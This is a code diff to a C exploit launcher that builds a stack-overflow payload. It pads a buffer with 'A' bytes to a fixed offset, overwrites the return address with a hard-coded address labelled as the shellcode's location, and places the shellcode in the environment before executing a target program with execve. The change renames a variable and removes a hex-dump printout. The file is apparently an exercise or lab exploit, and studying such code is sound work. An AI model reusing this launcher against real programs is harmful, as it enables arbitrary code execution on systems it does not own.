@@ -8,18 +8,13 @@
 
 int main() {
     char payload[POSISTION+4];
-    int value = 0xffffdf87;
+    int address_of_shellcode = 0xffffdf87;
 
     for(int i=0;i<POSISTION;i++)
         payload[i] = 'A';
 
-    *((int*)(payload + POSISTION)) = value;
+    *((int*)(payload + POSISTION)) = address_of_shellcode;
 
-    // Print the payload as a hex dump
-    for (int i = 0; i < POSISTION+4; i++) {
-        printf("\\x%02x", (unsigned char)payload[i]);
-    }
-    printf("\n");
     char *args[] = {NULL};
     char *envp[] = {"1","2","3","4","5","6","7",SHELLCODE,payload,NULL};
     execve(PATH, args, envp);
